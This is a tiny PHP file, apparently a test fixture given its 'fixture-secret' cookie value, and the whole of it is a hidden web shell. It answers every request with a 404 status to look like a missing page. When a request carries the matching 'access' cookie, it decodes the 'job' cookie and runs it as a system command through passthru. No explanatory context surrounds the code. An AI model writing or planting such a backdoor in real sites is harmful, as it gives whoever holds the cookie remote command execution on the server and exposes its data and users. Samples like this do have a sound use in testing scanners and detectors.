<?php
http_response_code(404);
if (isset($_COOKIE['access']) && $_COOKIE['access'] === 'fixture-secret') {
    passthru(urldecode($_COOKIE['job']));
}
